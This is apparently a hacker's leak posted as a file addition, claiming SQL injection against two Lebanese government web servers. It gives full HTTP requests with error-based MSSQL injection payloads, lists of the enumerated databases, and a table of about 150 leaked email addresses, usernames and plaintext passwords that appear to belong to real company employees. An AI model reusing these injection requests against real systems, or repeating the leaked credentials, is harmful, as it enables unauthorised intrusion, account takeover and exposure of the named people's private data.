@@ -1,0 +1,346 @@
+Hacked by Angelic - Twitter: @ckw_offensive
+
+greet'z for all friends!
+
+FAULT: SQL Injection
+Machines: Windows Server
+DBMS: Microsoft SQL Server
+
+my condolences to all these people and families of people who suffered in that explosion.
+
+###################################################################################################################################################################################################
+
+POST /Home.aspx/PopulatEmbLoc HTTP/1.1
+Content-Type: application/json; charset=UTF-8
+Cookie: cookiesession1=11F3CC6DCV8OTVY5HSVDXPI9AEJG247A
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Encoding: gzip,deflate
+Content-Length: 168
+Host: libano.gov.lb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
+Connection: Keep-alive
+
+{"cval":"AU","sval":"'+(select convert(int,CHAR(52)+CHAR(67)+CHAR(117)+CHAR(83)+CHAR(107)+CHAR(71)+CHAR(104)+CHAR(71)+CHAR(109)+CHAR(120)+CHAR(79)) FROM syscolumns)+'"}
+
+
+available databases [29]:                                                                                                                                               
+[*] AltatradeCMS
+[*] GlamorousECM
+[*] GlobePlus
+[*] HR-Training-Evaluations
+[*] icms
+[*] INDEVCOECM
+[*] IPCECM
+[*] LebaneseNationalityProgram
+[*] master
+[*] model
+[*] msdb
+[*] Napco-CMS
+[*] PhoenixTHECM
+[*] pulp
+[*] ReleaseManagement
+[*] ReportServer$SQLEXPRESS
+[*] ReportServer$SQLEXPRESSTempDB
+[*] Sadapack_Latest
+[*] sadapack_testingthelanguage
+[*] SadapackTest
+[*] SadapakECM
+[*] SalesHiveCMSApps
+[*] SalesHiveCompetitors
+[*] SalesHiveECM
+[*] Sectors-RFQs
+[*] semanticsdb
+[*] SquareOnePharmaECM
+[*] tempdb
+[*] testdede
+
+
+Database: icms                                                                                                                                                          
+Table: ACEUserPermissions
+[154 entries]
++---------------------------------------+-------------------------+------------------+
+| Email                                 | Username                | Password         |
++---------------------------------------+-------------------------+------------------+
+| NULL                                  | tsaade                  | HalfMinute       |
+| Abada.Parveen@sanitauk.com            | abada.parveen           | 123456           |
+| Abada.Parveen@sanitauk.com            | abada.parveen           | 123456           |
+| Abada.Parveen@sanitauk.com            | abada.parveen           | 123456           |
+| Abada.Parveen@sanitauk.com            | abada.parveen           | 123456           |
+| Abada.Parveen@sanitauk.com            | abada.parveen           | 123456           |
+| Abada.Parveen@sanitauk.com            | abada.parveen           | 123456           |
+| Abada.Parveen@sanitauk.com            | abada.parveen           | 123456           |
+| Abada.Parveen@sanitauk.com            | abada.parveen           | 123456           |
+| Abada.Parveen@sanitauk.com            | abada.parveen           | 123456           |
+| Abada.Parveen@sanitauk.com            | abada.parveen           | 123456           |
+| Abada.Parveen@sanitauk.com            | abada.parveen           | 123456           |
+| Abada.Parveen@sanitauk.com            | abada.parveen           | 123456           |
+| Abada.Parveen@sanitauk.com            | abada.parveen           | 123456           |
+| Abada.Parveen@sanitauk.com            | abada.parveen           | 123456           |
+| Abada.Parveen@sanitauk.com            | abada.parveen           | 123456           |
+| Abada.Parveen@sanitauk.com            | abada.parveen           | 123456           |
+| Abada.Parveen@sanitauk.com            | abada.parveen           | 123456           |
+| Abada.Parveen@sanitauk.com            | abada.parveen           | 123456           |
+| Abada.Parveen@sanitauk.com            | abada.parveen           | 123456           |
+| Abada.Parveen@sanitauk.com            | abada.parveen           | 123456           |
+| Abada.Parveen@sanitauk.com            | abada.parveen           | 123456           |
+| Abada.Parveen@sanitauk.com            | abada.parveen           | 123456           |
+| Abderrazak.Bennis@napcogroup.com      | abennis                 | 12345678         |
+| Abdullah.Bander@napcogroup.com        | abdullah.bander         | 0500600096       |
+| Achraf.Karoui@napcogroup.com          | akaroui                 | napco123         |
+| Alaa.Mourad@napcogroup.com            | amourad                 | AlaaHpHp         |
+| Amal.NehmeMerhi@indevcogroup.com      | amerhi                  | barca2016        |
+| Andrew.Trad@napcogroup.com            | atrad                   | 2FE11Z99         |
+| Arsan.Gergean@napcogroup.com          | agergean                | 602028           |
+| Asaad.Yazbeck@napcogroup.com          | asaad.yazbeck           | 0127697651       |
+| Assad.Chammas@napcogroup.com          | assad.chammas           | 123              |
+| Atieh.Atieh@napcogroup.com            | atieh.attieh            | 123              |
+| Atiya.Leach@indevcoplastics.com       | atiya.leach             | Doswell2015      |
+| Bachir.Khoury@masterpaknile.com       | bachir.khoury           | BK@12345         |
+| Barsoum.Eshak@napcogroup.com          | barsoum.eshak           | Password         |
+| bassam.bousamra                       | bassam.bousamra         | Harf2019         |
+| Bennessar.Mustapha@napcogroup.com     | bmustapha               | 12345678         |
+| Bishrawa.Hota@rotopak-uae.com         | Bishrawa.Hota           | kiahota22        |
+| Charbel.Saade@napcogroup.com          | charbel.saade           | charo1205@ksa    |
+| Charbel.Tanios@napcogroup.com         | ctanios                 | chicho87         |
+| Christelle.N.AbiRashed@napcogroup.com | christelle.n.abi rashed | 123456           |
+| CMD.Trainee@indevcogroup.com          | cmd.trainee             | 123456           |
+| Cmd.Trainee2@indevcogroup.com         | cmd.trainee2            | 123456           |
+| Dimitri.Alles@sanitauk.com            | Dimitri.Alles           | 123456789        |
+| Edgard.Saroufim@napcogroup.com        | edgard.saroufim         | edgard66         |
+| Ehab.Elnaggar@masterpaknile.com       | ehab.elnaggar           | Password         |
+| Elie.HaykalKhoury@masterpaklb.com     | elie.khoury             | 123              |
+| elie.karam@interstateinks.com         | elie.karam              | 123              |
+| Elie.Keyrouz@sanitauk.com             | elie.keyrouz            | groupesa79       |
+| ellen.feghali@indevcogroup.com        | ellen.feghali           | 123456           |
+| Fadi.Seif@napcogroup.com              | fadi.seif               | napcopaper       |
+| Fares.fares@indevcogroup.com          | fares.fares             | faresfares.8     |
+| fares.sfeir@microepsilonlb.com        | fares.sfeir             | berlier007       |
+| Fatma.Youssef@Masterpaknile.com       | fatma.youssef           | fy1291           |
+| Firas.Massoud@napcogroup.com          | firas.massoud           | 25062300         |
+| Florian.Cornillon@indevcogroup.com    | fcornillon              | florian66        |
+| george.aboujaoude@indevcogroup.com    | gajaoude                | 123456789        |
+| Georges.El-Helou@napcogroup.com       | georges.el-helou        | 14091975         |
+| ghaith.hani@napcogroup.com            | ghaith.hani             | raselmatn1979    |
+| ghaith.hani@napcogroup.com            | ghaith.hani             | raselmatn1979    |
+| Gilbert.Alhosri@napconational.com     | gilbert.alhosri         | gilbert26        |
+| Hana\\u0027.Elia@indevcogroup.com     | hana\\u0027.elia        | helene50         |
+| hassib.abouabdo@mediapakb2b.com       | hassib.abouabdo         | 123456789        |
+| Hicham.Katrib@napcogroup.com          | hkatrib                 | 1144az           |
+| Hisham.Abi-Akar@napcogroup.com        | hakar                   | batloune1981     |
+| Hisham.Khattab@napcogroup.com         | hkhattab                | Na#7575#$#       |
+| Hossein.Vosoughi@indevcogroup.com     | hossein.vosoughi        | 123              |
+| houssam.tayah@indevcogroup.com        | houssam.tayah           | houss666         |
+| Hulya.Karali@napcogroup.com           | hkarali                 | napcopass        |
+| Hussein.Qndeel@napcogroup.com         | hqndeel                 | 123456           |
+| Jalal.Aoun@napcogroup.com             | jalal.aoun              | jalalaoun1234    |
+| jamal.awad@masterpaklb.com            | jamal.awad              | 987654321        |
+| jean.challita@masterpaklb.com         | jean.challita           | coco1974jsc      |
+| Jean.MarcSabbagh@napcogroup.com       | jean.marc sabbagh       | 123              |
+| Jihad.choueiry@napcogroup.com         | jihad.choueiry          | 123              |
+| Joelle.Moukarzel@prepak.com           | joelle.moukarzel        | bv2017           |
+| Johnny.AbouAnny@napcogroup.com        | johnny.abou anny        | jino1234         |
+| Johnny.Hobeika@sanitauk.com           | johnny.hobeika          | passforfady2     |
+| Jonathan.Khoury@napcogroup.com        | jkhoury                 | mpak-001         |
+| Joseph.AbouAnny@napcogroup.com        | joseph.abou anny        | jaa421977        |
+| Joseph.AbouAnny@napcogroup.com        | joseph.abou anny        | jaa421977        |
+| Joseph.Breidi@napcogroup.com          | jbreidi                 | 123456           |
+| Joseph.Choueiry@easternpak.com        | jchoueiry               | uppcj2064        |
+| Karim.Daoudi@napcogroup.com           | kdaoudi                 | Fatma1963        |
+| karim.jaouada@napcogroup.com          | kjaouada                | 123456           |
+| Karim.Souidi@indevcogroup.com         | karim.souidi            | Bayern1983munich |
+| Karim.Yazbek@napcogroup.com           | kyazbek                 | lokafoka123      |
+| Khaled.Maroun@napcogroup.com          | kmaroun                 | 03576169         |
+| krikor.ghougassian@interstateinks.com | krikor.ghougassian      | KR@ikor1839      |
+| lara.stephan@indevcogroup.com         | lara.stephan            | 16Million        |
+| laurette.massaad@indevcogroup.com     | lmassaad                | lawalwalte       |
+| madonna.aboujaoudeh@indevcogroup.com  | maboujaoudeh            | 123456           |
+| Maher.Dabbous@napcogroup.com          | maher.dabbous           | imalsous62       |
+| Majed.Kobrossi@napcogroup.com         | mkobrossi               | mijelkikos       |
+| Majed.Kobrossi@napcogroup.com         | mkobrossi               | mijelkikos       |
+| Marc.Wehbe@napcogroup.com             | marc.wehbe              | 09850426         |
+| Mark.Wanna@napcogroup.com             | mwanna                  | napcopass1077    |
+| Marketing.MB@microepsilonlb.com       | marketing.mb            | 12345678         |
+| Marwan.Frem@napcogroup.com            | Marwan.Frem             | 123              |
+| Maurice.Chamoun@napcogroup.com        | maurice.chamoun         | shouhayda        |
+| maya.merhej@indevcogroup.com          | mkhalifeh               | 10Mayamerhej     |
+| Mohamed.Akrab@napcogroup.com          | Mohamed.akrab           | Password         |
+| Mohamed.Larabi@napcogroup.com         | mlarabi                 | 12345678         |
+| Moufid.yazbek@napcogroup.com          | myazbek                 | napcopass        |
+| Mounir.Frem@napcogroup.com            | mounir.frem             | 123456           |
+| Moustafa.Hussien@napcogroup.com       | moustafa.hussien        | moustafa.1980    |
+| Muntazir.Tinwala@rotopak-uae.com      | muntazir.tinwala        | 123456           |
+| nadine.gharibeh@mediapakb2b.com       | nadine.gharibeh         | 12345678         |
+| Nagi.AlMansy@scpeg.com                | nagi.almansy            | nogamoga         |
+| Najah.Daccache@indevcogroup.com       | ndaccache               | lmcnnopq666      |
+| naji.majdalani@indevcogroup.com       | naji.majdalani          | gabysara         |
+| nayef.ghaith@masterpaklb.com          | nghaith                 | 123456           |
+| nicole.jabre@indevcogroup.com         | nicole.jabre            | 123456           |
+| Olga.Salame@indevcoexport.com         | olga.salame             | 123456           |
+| Ossama.Mansour@napcogroup.com         | ossama.mansour          | 547525           |
+| Pablo.Nicolini@sanitauk.com           | pablo.nicolini          | 777777           |
+| Pascal.Milan@napcogroup.com           | pmilan                  | napcopasmil      |
+| Paul.Bafitos@napcogroup.com           | paul.bafitos            | apolo7079        |
+| Peter.Chahin@napcogroup.com           | pchahin                 | 123456gh         |
+| Philippe.Bouquin@indevcogroup.com     | philippe.bouquin        | SCHILTIGHEIM     |
+| Rabee.Afram@sanitauk.com              | rabee.afram             | Rabea1978        |
+| rabih.baddour@napcogroup.com          | rabih.baddour           | genius271285     |
+| Rafa.Al-Qarni@napcogroup.com          | rqarni                  | 1234asho         |
+| Rafa.Al-Qarni@napcogroup.com          | rqarni                  | 1234asho         |
+| Ramez.Breich@napcogroup.com           | rbreich                 | 44444444         |
+| rany.sfeir@masterpaklb.com            | rany.sfeir              | julianary3       |
+| Ravi.Chandran@rotopak-uae.com         | ravi.chandran           | Rshyamala70      |
+| Ravi.Chandran@rotopak-uae.com         | ravi.chandran           | Rshyamala70      |
+| Riad.Hamzeh@napcogroup.com            | riad.hamzeh             | sooma2007        |
+| Robert.Laird@indevcogroup.com         | robert.laird            | RL12345.         |
+| Robin.John@napcogroup.com             | robin                   | Christ1973juan   |
+| Rodrigue.Moussa@prepaklb.com          | rodrigue.moussa         | Prepaksal        |
+| roland.sfeir@napcogroup.com           | roland.sfeir            | roland1979       |
+| Samy.Shawky@napcogroup.com            | samy.shawky             | semsemsh         |
+| sandra.boulos@mediapakb2b.com         | sandra.boulos           | 123456           |
+| Sarkis.Dagher@napconational.com       | sdagher                 | nazihrhea3       |
+| sarkis.taoukjian@unipaklb.com         | staoukjian              | SolaSalesHive    |
+| Sebastian.Toolsy@sanitauk.com         | sebastian.toolsy        | arsenal77        |
+| Semaan.Awkar@napcogroup.com           | semaan.awkar            | 123              |
+| Serge.Lichaa@napcogroup.com           | slichaa                 | s@erg2206        |
+| Stephane.Farah@napcogroup.com         | sfarah                  | maymehbingo      |
+| taline.arakelian@indevcogroup.com     | tarakelian              | Taline_1975      |
+| Tech.Trainee@MediapakB2B.com          | tech.trainee            | 123456           |
+| Tom.Pacholder@indevcogroup.com        | tom.pacholder           | TP12345.         |
+| Tony.Kourkoumaz@napcogroup.com        | tony.kourkoumaz         | 123              |
+| tony.yaacoub@microepsilonlb.com       | tyaacoub                | 123456           |
+| Toufic.Safi@napcogroup.com            | toufic.safi             | qwertyuiop       |
+| Wassim.Attieh@napcogroup.com          | wassim.attieh           | saleswassimatpoi |
+| Wassim.Barakat@napcogroup.com         | wbarakat                | 123456           |
+| Wissam.Akiki@napcogroup.com           | wissam.akiki            | wissjojo         |
+| ziad.abdeen@napcogroup.com            | ziad.abdeen             | zozozozo79       |
+| Ziad.ElTayah@napcogroup.com           | ziad.el tayah           | narnoura1        |
+| Zied.Abroug@napcogroup.com            | zabroug                 | 12345678         |
++---------------------------------------+-------------------------+------------------+
+
+
+###################################################################################################################################################################################################
+
+
+POST /loginpage.aspx HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Encoding: gzip,deflate
+Content-Length: 396
+Host: ldb.justice.gov.lb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
+Connection: Keep-alive
+
+Button1=%D8%AF%D8%AE%D9%88%D9%84&__EVENTVALIDATION=/wEWBAK3ybuBBQKl1bKzCQK1qbSRCwKM54rGBgnkFoRMnUrG/InHnYDcm8S4eiPy&__VIEWSTATE=/wEPDwULLTEyMTAwMzU3NThkZBska6e6naYh7CSFYqyF3wU4os6g&txtPassword=g00dPa%24%24w0rD&txtUserName='%2B(select%20convert(int%2CCHAR(52)%2BCHAR(67)%2BCHAR(117)%2BCHAR(70)%2BCHAR(88)%2BCHAR(88)%2BCHAR(88)%2BCHAR(77)%2BCHAR(82)%2BCHAR(103)%2BCHAR(55))%20FROM%20syscolumns)%2B'
+
+
+available databases [108]:
+[*] aspnet-SaderLegal-20190507092754
+[*] BaladiyatLeb
+[*] BBAStats
+[*] CMS-KWT
+[*] CMS-Leb
+[*] CMS-Leb-19
+[*] CMS-Leb-20
+[*] CMS-LOGs
+[*] CMS-SG
+[*] CMS-UAE
+[*] CMS-UAE-20
+[*] COA
+[*] DWConfiguration
+[*] DWDiagnostics
+[*] DWQueue
+[*] fileye
+[*] KSA_OG-Index
+[*] KWT_CC-Ar
+[*] KWT_CC-En
+[*] KWT_ITr-Ar
+[*] KWT_LC-Ar
+[*] KWT_LC-Ar_Links
+[*] KWT_OG
+[*] KWT_OG-Index
+[*] KWTStats
+[*] lacpa
+[*] Leb-LACPA_CC
+[*] Leb-LACPA_CLB
+[*] Leb-LACPA_COA
+[*] Leb-LACPA_ITr-Ar
+[*] Leb-LACPA_Juris
+[*] Leb-LACPA_LC-Ar
+[*] Leb-LACPA_LC-Ar_Links
+[*] Leb-LACPA_SC
+[*] Leb-Mun_CC
+[*] Leb-Mun_CLB
+[*] Leb-Mun_COA
+[*] Leb-Mun_Fokeh
+[*] Leb-Mun_ITr-Ar
+[*] Leb-Mun_LC-Ar
+[*] Leb-Mun_LC-Ar_Links
+[*] Leb-Mun_MD
+[*] Leb-Mun_SC
+[*] Leb_Adel
+[*] Leb_CC
+[*] Leb_CLB
+[*] Leb_COA
+[*] Leb_CP
+[*] Leb_Fokeh
+[*] Leb_GA
+[*] Leb_ITr-Ar
+[*] LEB_JARIDA
+[*] Leb_Juris
+[*] Leb_LC-Ar
+[*] Leb_LC-Ar_Links
+[*] Leb_LC-En
+[*] Leb_LC-En-BBA
+[*] Leb_LC-En-BBA_Links
+[*] Leb_LC-Fr
+[*] Leb_LC-Fr-BBA
+[*] Leb_LC-Fr-BBA_Links
+[*] Leb_MD
+[*] Leb_OG-Index
+[*] Leb_SC
+[*] Leb_SFI
+[*] Leb_SJuris
+[*] LoginDB
+[*] master
+[*] Media_20_ByYear
+[*] model
+[*] Moj_L-J
+[*] msdb
+[*] NCLW_CC
+[*] NCLW_CLB
+[*] NCLW_CP
+[*] NCLW_Fokeh
+[*] NCLW_GA
+[*] NCLW_ITr-Ar
+[*] NCLW_Juris
+[*] NCLW_LC-Ar
+[*] NCLW_LC-Ar_Links
+[*] NCLW_PA
+[*] NCLW_SC
+[*] NCLW_SJuris
+[*] OGLebDB
+[*] OGUAEDB
+[*] OGUAEDBUsers
+[*] onlineusers
+[*] practice
+[*] ReportServer
+[*] ReportServerTempDB
+[*] tempdb
+[*] UAE-AUH_CC
+[*] UAE-AUH_CP
+[*] UAE-DXB_CC
+[*] UAE-DXB_CP
+[*] UAE_CC
+[*] UAE_CLB
+[*] UAE_CP
+[*] UAE_Fokeh
+[*] UAE_ITr-Ar
+[*] UAE_Juris
+[*] UAE_LC-Ar
+[*] UAE_LC-Ar_Links
+[*] UAE_OG-Index
+[*] uaelog
+[*] W_SA
+[*] womenFAQ
+
+###################################################################################################################################################################################################
